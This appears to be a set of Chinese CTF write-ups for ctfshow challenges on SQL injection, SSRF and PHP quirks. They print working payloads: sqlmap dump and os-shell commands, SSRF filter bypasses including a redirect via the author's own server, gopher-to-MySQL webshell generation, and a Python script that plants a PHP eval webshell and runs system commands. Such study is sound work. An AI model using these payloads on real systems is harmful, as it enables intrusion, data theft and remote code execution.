firstspace = False, False, False        for i in xrange(len(payload)):            if not firstspace:                if payload[i].isspace():                    firstspace = True                    retVal += chr(0x9)                    continue            elif payload[i] == &#x27;\\&#x27;&#x27;:                quote = not quote            elif payload[i] == &#x27;&quot;&#x27;:                doublequote = not doublequote            elif payload[i] == &quot; &quot; and not doublequote and not quote:                retVal += chr(0x9)                continue            elif payload[i] == &quot;=&quot;:                retVal += chr(0x9) + &quot;like&quot; + chr(0x9)                continue            retVal += payload[i]        return retVal    \n\n           sqlmap -u &quot;http://d692eb86-93f0-47d7-ab6c-41237665a80f.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://d692eb86-93f0-47d7-ab6c-41237665a80f.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; --dbms mysql  --tamper=ctfshow209.py -D ctfshow_web -T ctfshow_flav -C &quot;ctfshow_flagx&quot; --dump\n\n      210. sqlmap \n\n           这里有个自定义操作\n\n           return strrev(base64_decode(strrev(base64_decode($id))));\n\n           我们需要逆着来，过程刚开始没想清楚。逆过来应该是先从外层开始\n\n           # 核心retVal = b64encode(retVal[::-1].encode()).decode()retVal = b64encode(retVal[::-1].encode()).decode()\n\n           sqlmap -u &quot;http://366f932d-951c-4aec-b6e2-bab9aa459827.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://366f932d-951c-4aec-b6e2-bab9aa459827.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; --dbms mysql  --tamper=ctfshow209.py -D ctfshow_web -T ctfshow_flavi -C &quot;ctfshow_flagxx&quot; --dump\n\n      211. sqlmap\n\n           先两关的组合，直接打\n\n      212. sqlmap 一样\n\n      213. sqlmap 在三题的基础上练习getshell\n\n           ![image-20220820173840013](/image-20220820173840013.png)\n\n           这里拿到了网站根目录的shell，上面有两个临时文件\n\n           ![image-20220820174533319](/zouErhlZTPN1HdY.png)\n\n           一个是命令执行文件，可以直接执行系统命令\n\n           sqlmap -u &quot;http://140cb7d1-5ec7-495d-892a-3160ce479404.challenge.ctf.show/api/index.php&quot; --safe-url=&quot;http://140cb7d1-5ec7-495d-892a-3160ce479404.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --method=&quot;PUT&quot; --data=&quot;id=1&quot; --headers=&quot;Content-Type: text/plain;&quot; --refer=&quot;ctf.show&quot; --dbms mysql  --tamper=ctfshow209.py --os-shell\n","tags":["ctfshow"]},{"title":"CTFSHOW-SSRF","url":"/2022/09/11/CTF-SHOW%20SSRF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"\nSSRF开始啦\n题面如图，经典开场\n\n\n\n先来看看curl_setopt里面的选项设置\nCURLOPT_HEADER\t\t\t\t\t\t启用时会将头文件的信息作为数据流输出。CURLOPT_RETURNTRANSFER\t\t\ttrue 将curl_exec()获取的信息以字符串返回，而不是直接输出。\n​    当前目录存在flag.php(不过为啥扫不出来呜呜呜)，但是需要以本地用户身份去访问\n\n自然就是利用SSRF伪造服务器身份去本地访问他就行，协议就是最常见的http\nurl=http://localhost/flag.php\n\nssrf开始啦 限制内网IP\n题面如图，flag依然在于flag.php中，并且题目限制了url必须为http或http，以及黑名单过滤localhost/127.0.0.1\n\n看下parse_url怎么弄的\n\n\n\n这里用到了之前的一个知识点，更改IP地址写法\nhttp://www.jsons.cn/ipnum/ 或者转换成其他进制也可以\nurl=http://2130706433/flag.php\n\nssrf开始啦 限制内网IP\n题面如图，flag依然在于flag.php中\n\n\n\n截取的更短了，上面的可以继续打\n或者题目环境为linux，所以0.0.0.0等价于127.0.0.1\n\nurl=http://0.0.0.0/flag.php\n\nssrf开始啦 限制内网IP 禁止30x跳转\n题面如图，flag依然在于flag.php中\n\n\n\n也就是直接过滤了0和1，不过过滤句号是什么鬼…\n这里利用了DNS重绑定或者302跳转\nhttps://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/12.SSRF/01.DNS%E9%87%8D%E7%BB%91%E5%AE%9A.html\nhttps://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/12.SSRF/SSRF.html#%E7%9F%AD%E5%9C%B0%E5%9D%80--302%E8%B7%B3%E8%BD%AC-%E7%BB%95%E8%BF%87\n对于DNS重绑定，这里不太好弄因为没域名。不过wp上他们找到了一个存在的值为127.0.0.1的A记录\nhttp://sudo.cc/。我这里就用302跳转的办法，先向我的ip发起请求，然后跳转回flag文件处\n\n然后访问\nurl=http://43.140.198.45:81\n尴尬了，应该是url_parse解析的缘故，那就用上面的吧\n\nssrf开始啦 限制内网IP\n\n\n\n这回是限制域名部分的长度，不过之前的过滤倒是没啦\n用之前0.0.0.0的整数表示，即0即可直接访问\n这里穿插一个本机ip/127.0.0.1/0.0.0.0的区别\nhttps://www.cnblogs.com/HuiShouGuoQu/p/13445881.html\n而且127.0.0.1是可以缩写成127.1\n\n所以即可用\nurl=http://127.1/flag.php或者url=http://0/flag.php\n\nssrf开始啦 限制内网IP\n限制域名长度到3\n\nurl=http://0/flag.php\n\nssrf开始啦 限制内网IP\n\n\n\ngethostbyname()\t\t成功时返回 IPv4 地址，失败时原封不动返回 hostname 字符串。filter_var() 返回过滤后的数据，如果过滤失败则返回 false查看其中的选定过滤器FILTER_VALIDATE_INT\t\t\t\tValidates value as integer, optionally from the specified range, and converts to \tint on success.String values are trimmed using trim() before comparison.FILTER_FLAG_NO_PRIV_RANGE \tFails validation for the following private IPv4 ranges: 10.0.0.0/8, 172.16.0.0/12 and 192.168.0.0/16.  要求值不是 RFC 指定的私域 IP\tFILTER_FLAG_NO_RES_RANGE\tFails validation for the following reserved IPv4 ranges: 0.0.0.0/8, 169.254.0.0/16, 127.0.0.0/8 and 240.0.0.0/4. 要求值不在保留的 IP 范围内我们使用前面的那一套环路地址应该是触发了127.0.0.0/8这个限制\n淦，涉及啦一些网段的知识还没搞懂    \n绕过用的就是之前的302条转或DNS重绑定，后者本质其实就是域名所有者可以随时修改解析的IP，对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。感觉还有点条件竞争，就是第一次解析的ip绕过if限制，然后之后再去访问的时候就解析到了其他ip上。直接上线上网站吧\n在最后添加解析IP指向环路地址和设置一个任意地址\n\n多POST的几次，可以看到前面输出的是8.8.8.8绕过if，但是后面其实访问了127.0.0.1\n\n\nssrf开始啦 限制内网IP\n\n\n\n这回换了个思路，也就是必须得是http://ctf.xxxxshow的才可以去访问\n这里可以利用解析URL所出现的问题，也就是问题点出在parse_url()上\nhttps://www.cnblogs.com/tr1ple/p/11137159.html 给出了一些总结\n自己也实践一下寻找一下这个函数的匹配规律\n从解释上就已经可以看到，这个函数相对来讲是不安全的\n\n先给出一个较为完整、正常的解析\n\n从这里可以得出结论：//后会解析到host；/后会解析到path\n\n特别地，如果//先跟到是?那么就会优先被解析到query，而不是path\n还有一个特殊的@,会解析最后一个@跟到字符串作为host\n\n所以对于这道题，我们的目的是解析到host为localhost，path为/flag.php\n题目的限制为http://ctf.xxxshow\n所以首先通过@来替换掉host，让前面的ctf.xxx变成user；对于后面结尾的show，可以通过放在query处\n\nurl=http://ctf.xxx@localhost/flag.php?show\n\n打无密码的mysql gopher协议\n题目给出了提示：无密码的mysql是什么意思? ssrf在什么地方呢\n先来分析一下题目，前端源码上看到了输入框的传递url，提交的数据会被发送至check.php。然后这里有个隐藏参数returl，修改一下参数值看看有无回显    \n\n存在回显，证实了确实有ssrf在参数点returl上\n\n\n\n关于mysql与ssrf\nhttps://paper.seebug.org/510/\ngopher协议基本格式，主要都是基于tcp协议\ngopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流\n这个工具已经帮我们整理好了格式https://github.com/tarunkant/Gopherus\n用python2写的，mac上不知道为啥pip不见了\n直接用工具生成写一句话木马的payload \n\n\n这里需要注意的是还需要将payload进行二次编码，因为在传输到服务器后会进行一次解码，会导致转义\n\n然后蚁剑连上就行\n\n打redis\n题目直接给出了源码\n\n\n\nssrf参数点url，攻击内网redis\n\n直接打就行，后面依然连蚁剑\n","tags":["ctfshow"]},{"title":"CTFSHOW-PHP特性","url":"/2022/10/06/CTF-SHOW%20PHP%E7%89%B9%E6%80%A7%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","content":"\nweb89. intval\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;\n这里引入函数 intval(mixed $value, int $base = 10): int通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。成功时返回 value 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。\n也就是说传一个对象过去即可，这里选择传一个数组\n?num[]=whatever\n\nweb90. intval\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n还是针对intval函数的研究，我们接着看文档\n如果 base 是 0，通过检测 value 的格式来决定使用的进制：如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，将使用 10 进制 (decimal)。\n所以穿一个16进制的4476即可\n?num=0x117c\n\nweb91. preg_match\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono\n仔细观察preg_match()可以发现模式修饰符不太一样\ni (PCRE_CASELESS)如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。m (PCRE_MULTILINE)默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， &quot;行首&quot;元字符 (^) 仅匹配字符串的开始位置， 而&quot;行末&quot;元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 D 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 &quot;\\n&quot; 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。\n也就是说，前一个匹配换行符，将以换行为分隔符，逐行进行匹配；后一个不匹配\n?cmd=%0aphp\n\nweb92. php弱类型\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:29:30# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n注意到了==和===的区别\n=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较== 在进行比较的时候，会先将字符串类型转化成相同，再比较，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。\n但这题后面又用了intval函数，所以还是十六进制绕过吧\n?num=0x117c\n\nweb93. 弱类型 intval\n这回可以用八进制绕过\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:32:58# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n?num=010574\n\nweb94. strpos\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:46:19# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n这回换成了强类型比较，并且增加了strpos来定位0\nstrpos(string $haystack, mixed $needle, int $offset = 0): int返回 needle 存在于 haystack 字符串起始的位置(独立于 offset)。同时注意字符串位置是从0开始，而不是从1开始的。\n也就是不能定位位置在0，同时还要能让intval识别出正确的数来，可以验证intval对于空格是可以绕过的，因此开头加个空格即可\n{:height 242, :width 497}\n?num= 010574\n\nweb95.\n\n题面如下，多过滤了一个点号，可以继续用\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 16:53:59# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\n\n\nweb96. 读文件\n\n题面如下，这题搞了一个文件读取\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 19:21:24# @link: https://ctfer.com*/highlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123;    if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123;        die(&quot;no no no&quot;);    &#125;else&#123;        highlight_file($_GET[&#x27;u&#x27;]);    &#125;&#125;\nflag.php不能直接读，但是hight_file也支持php伪协议\n\n?u=php://filter/read=convert.base64-encode/resource=flag.php或者也可以直接的，加上相对路径 ./flag.php\n\n\n\nweb97. md5强类型比较\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 19:36:32# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt;\n利用特性：数组绕过\nphp中的md5()函数无法处理数组类型数据，对于数组类型数据返回NULL，当我们传入两个数组时，就会变成两个NULL，也就是NULL==NULL，成功绕过\na[]=1&amp;b[]=2\n\n\n\nweb98. 传参特性，考查三目运算符和取地址\n\n题面如下\nNotice: Undefined index: flag in /var/www/html/index.php on line 15Notice: Undefined index: flag in /var/www/html/index.php on line 16Notice: Undefined index: HTTP_FLAG in /var/www/html/index.php on line 17&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 21:39:27# @link: https://ctfer.com*/include(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt;\n第一行：如果存在get传参，则把post传参地址给get，可以简单理解为post覆盖了get第四行，如果get参数 HTTP_FLAG 的值为flag，就读取文件，也就是输出flag\n?1=2POST:HTTP_FLAG=flag\n\n\n\nweb99. in_array() 弱类型比较\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-18 22:36:12# @link: https://ctfer.com*/highlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123;     array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123;    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt;\n在数组中随机往里存值，然后从get传参的值如果在随机数数组中，就可以往对应文件名中写数据\n这里关注一下in_array()\nin_array(mixed $needle, array $haystack, bool $strict = false): bool大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。在 PHP 8.0.0 之前，string needle 在非严格模式下将会匹配数组中的值 0，反之亦然。这可能会导致不希望的结果。其它类型也存在类似的边缘情况。如果不是绝对确定有关值的类型，请始终使用 strict flag 以避免意外行为。\n也就是说get传参的值与数组的比较是弱类型，字符串将会转换成数值后再去比较。所以可以构造一个123.php，然后匹配到后即可写入恶意代码到该文件中并被解析。\n# coding=gbkimport requestsurl = &quot;http://02822d1a-f380-4901-af37-15bc5e20aed6.challenge.ctf.show/?n=123.php&quot;data = &#123;    &#x27;content&#x27;: &quot;&lt;?php @eval($_POST[&#x27;hack&#x27;]); ?&gt;&quot;&#125;while(True):    r = requests.post(url, data=data)    r1 = requests.get(url=&quot;http://02822d1a-f380-4901-af37-15bc5e20aed6.challenge.ctf.show/123.php&quot;)    if r1.status_code == 200:        data = &#123;            &#x27;hack&#x27;: &quot;system(&#x27;nl flag36d.php&#x27;);&quot;        &#125;        r2 = requests.post(url=&quot;http://02822d1a-f380-4901-af37-15bc5e20aed6.challenge.ctf.show/123.php&quot;, data=data)        print(r2.text)        break\n\n\n\nweb100. 逻辑运算优先级\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-21 22:10:28# @link: https://ctfer.com*/highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;\n看样子是想让我们拼接出一个命令执行来\n这里注意逻辑运算符and，其中优先级运算关系为&amp;&amp; &gt;  =  &gt; and\n所以优先赋值操作，所以后面随便构造\n?v1=1&amp;v2=system(&#x27;ls&#x27;)&amp;v3=;有些查看文件命令读不出来?v1=1&amp;v2=system(&#x27;tac ctfshow.php&#x27;)&amp;v3=;\n\n\n\nweb 101.  修补100题非预期,替换0x2d     类反射\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-22 00:26:48# @link: https://ctfer.com*/highlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123;        if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;\n前面的逻辑都是一样的，只不过在命令执行拼接的时候过滤了很多符号\nPHP Reflection API是PHP5才有的新功能，它是用来导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。$class = new ReflectionClass(‘ctfshow’); // 建立 Person这个类的反射类$instance = $class-&gt;newInstanceArgs($args); // 相当于实例化ctfshow类\n超，这可比JAVA反射简单多了（\nv1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n\n\nweb101.  换个姿势\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-23 20:59:43*/highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;\n首先通过substr截取字符串，后面一位2限制了偏移位置\n其次关注call_user_func\ncall_user_func(callable $callback, mixed ...$args): mixed第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。\nv3文件名可控，想让$str的值为webshell，就需要$s能为数字形式的webshell\n思路可以通过编码的方式来构造，其中shell构造为\n&lt;?=`tac *`;  \t     # 说明：&lt;?=是echo()的快捷用法\n{:height 259, :width 228}\n接着，先将其进行base64编码，再16进制编码，这样回调函数就可以使用hex2bin()，而写入文件时通过伪协议进行base64解码。（直接16进制编码会包含字母），去掉==冗余恰好可以满足全数字\n{:height 400, :width 420}\nsubstr截取字符串，后面一位2限制了偏移位置，所以在前面加上两位就可以截取到正确的字符串\nv2=00504438395948526859794171594473&amp;v3=php://filter/write=convert.base64-decode/resource=racerz.phpPOST:v1=hex2bin\n\n\n\nweb103. 换个姿势\n\n题面如下，过滤了一下php，不知道是啥逻辑，payload继续打\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-23 21:03:24*/highlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123;        file_put_contents($v3,$str);    &#125;    else&#123;        die(&#x27;Sorry&#x27;);    &#125;&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;\n\n\n\nweb104. 换个姿势 数组绕过\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 22:27:20*/highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2))&#123;        echo $flag;    &#125;&#125;?&gt;\n要去比较get传参和post传参的哈希SHA1是否相等，这里用的是弱类型进行的比较。和md5一样，该函数同样针对数组返回NULL，即通过数组绕过即可\nv2[]=1POST: v1[]=1\n\n\n\nweb105. 换个姿势 经典变量覆盖\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 22:34:07*/highlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces);?&gt;\n首先限制了$key!=error $value!=flag\n但是可以通过覆盖变量值$error或者$suces通过die时回显出来\n方式一：回显errorsuces=flagPOST: error=suces方式二：回显sucessuces=flag&amp;flag=直接将flag置空\n\n\n\nweb106. 换个姿势\n\n题面如下，依照前一题增加了个判断两变量值不能相等，依然可以数组绕过\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: atao# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 22:38:27*/highlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;        echo $flag;    &#125;&#125;?&gt;\n\n\n\nweb107. 换个姿势\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 23:24:14*/highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v3 = $_GET[&#x27;v3&#x27;];       parse_str($v1,$v2);       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;           echo $flag;       &#125;&#125;?&gt;\n关注一下parse_str()\nparse_str(string $string, array &amp;$result): void如果 string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）\n{:height 622, :width 413}\n所以也就是构造一个明文和一个md5哈希值然后传就完了\nv3=testPOST: v1=flag=098f6bcd4621d373cade4e832627b4f6\n\n\n\nweb108. 换个姿势 ereg漏洞\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-28 23:53:55*/highlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE)  &#123;    die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123;    echo $flag;&#125;?&gt;\n几个函数的特性\nint 